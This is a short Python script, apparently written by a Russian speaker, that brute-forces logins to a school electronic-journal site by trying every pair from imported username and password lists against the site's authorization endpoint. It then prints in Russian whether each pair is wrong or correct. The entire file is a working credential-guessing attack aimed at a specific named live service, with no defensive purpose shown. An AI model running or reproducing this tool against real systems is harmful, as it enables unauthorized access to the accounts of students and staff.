from turtle import pos
from requests import post
from database import paswords
from database import usernames
from colorama import init
from colorama import Fore, Back, Style
import time


print()
init()
for i in paswords:
    for x in usernames:
        start_time = time.time()
        params= {
            'username':x,
            'password':i
        }

        req = post('https://soch152.eljur.ru/ajaxauthorize', params=params)

        answ = req.json()['result']
        if answ is False:
            print(Fore.RED + f'Пробую {x}:{i} | Ошибка')
        else:
            print(Fore.GREEN + f'Пробую {x}:{i} | Данные верны')